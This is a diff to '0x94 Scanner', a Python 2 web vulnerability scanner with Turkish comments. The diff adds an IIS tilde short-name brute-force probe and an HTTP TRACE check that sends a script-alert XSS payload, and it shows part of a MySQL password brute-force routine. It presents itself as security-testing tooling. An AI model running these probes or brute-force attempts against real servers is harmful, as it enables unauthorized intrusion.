@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 # 0x94 Scanner v1.0b
 #Python 2x sürümlerde çalışır.
-#mysql eklentisi gerekli onuda https://pypi.python.org/pypi/MySQL-python adresinden kurun
-#Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL/XSS/LFI) INJECTION SCANNER
+#Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL/XSS/LFI/CMD) INJECTION SCANNER
+#Microsoft IIS tilde character acigini otomatik test eder.
 #Sunucu IP adresi ve kullanilan http bilgisini alir
 #Sunucu Allow header listesini alir
 #Sitedeki tum linkleri 2 farkli yontemle alir (ayni linkleri tarayip zaman kaybi yapmaz)
@@ -34,7 +34,7 @@
 #butun sonuclari rapor.txt ye kaydeder
 #sadece guvenlik testleri icin kullanin
 #Turk sitelerinde tarama yapmaz.
-#https://github.com/antichown/0x94scanner /
+#https://github.com/antichown/0x94scanner
 #https://twitter.com/0x94
 
 
@@ -55,13 +55,6 @@ from time import sleep
 import random
 import os
 import sre
-
-
-try:
-    import MySQLdb
-except ImportError:
-    print 'Mysql eklentisi gerekli onuda https://pypi.python.org/pypi/MySQL-python adresinden kurun'
-    sys.exit(1)
 
 
 
@@ -117,7 +110,44 @@ limitlinkler={}
 
 
 
+def iistilde(url):
+    charset = set(list('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'))
+    print "IIS tilde acigi taraniyor bu islem biraz surebilir lutfen bekleyin"
+    uzanti=["","jpg","gif","asp","php","aspx","htm","html"]
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
+    opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
+        ("Cookie", "0x94Scanner=0x94")]
+    for brutechar in charset:
+	for geluzanti in uzanti:
+	    	try:
+		    print brutechar+"."+geluzanti
+		    urlnormal=url+"/%2F"+brutechar+"*%7E1."+geluzanti+"*%2Fa.aspx?aspxerrorpath=/"
+		    urlac = opener.open(urlnormal)   
+		    response = urlac.code
+		    if response=="404":
+			yaz("IIS tilde acigi var / bulunan veri= "+brutechar+"."+geluzanti,True)
+			break
+		except urllib2.HTTPError,  e:
+		    if(e.code==404):
+			yaz("IIS tilde acigi var / bulunan veri= "+brutechar+"."+geluzanti,True)    
+			break
+		except urllib2.URLError,  e:
+		    print e.reason
+		    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+		    #yaz(mesaj)
+		except:
+		    mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)       
+    
+
 def mysqlportubrute(ip):
+    
+    try:
+	import MySQLdb
+    except ImportError:
+	print 'Taradiginiz sitenin mysql portu acik,mysql yi brute etmem icin Python Mysql eklentisi gerekli onuda https://pypi.python.org/pypi/MySQL-python adresinden kurun'
+	sys.exit(1)
+
     
 	passlar=["admin",
                 "test",
@@ -2264,6 +2294,28 @@ def aynivarmi(keyurl):
 
 
 
+
+def httptrace(url):
+    
+    try:
+	print "Http trace kontrol ediliyor..."
+	o = urlparse.urlparse(url)
+	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	ipsi=socket.gethostbyname(o.hostname)
+	yaz("IP Adresi : "+ipsi,True)
+	sock.connect((ipsi,80))
+	req = "TRACE /0x94<script>alert(\"0x94scanner\")</script>.html HTTP/1.1\r\n"
+	req += "Host: " + o.hostname + "\r\n"
+	req += "Connection: close\r\n"
+	req += "\r\n\r\n"  
+	sock.send(req)
+	data = sock.recv(4096)	
+	if "0x94<script>alert(\"0x94scanner\")</script>" in data:
+	    yaz("TRACE Cross-Site Scripting bulundu \n Veri="+tracesonuc,True)     
+	
+    except:
+	print "http trace alinirken hata oldu"    
+
 def optionsheader(url):
     try:
 	print "Allow Header Bilgisi Aliniyor"
@@ -2286,7 +2338,7 @@ def optionsheader(url):
 		yok=0
 	else:
 		  
-	    print "[+] Sunucuda WebDav kurulu"
+	    yaz("[+] Sunucuda WebDav kurulu",True)
     except:
 	print "Allow Header alinirken hata oldu"
 
@@ -2615,7 +2667,9 @@ def main():
 	ooooo = maketrans(giris, cikis)
 	asd=url.translate(ooooo)
 	if "{}>" not in asd:
+		iistilde(url)
 		headerbilgi(url)
+		httptrace(url)
 		optionsheader(url)
 		cx=urlparse.urlparse(url)
 		hostcx=cx.netloc.replace("www","")
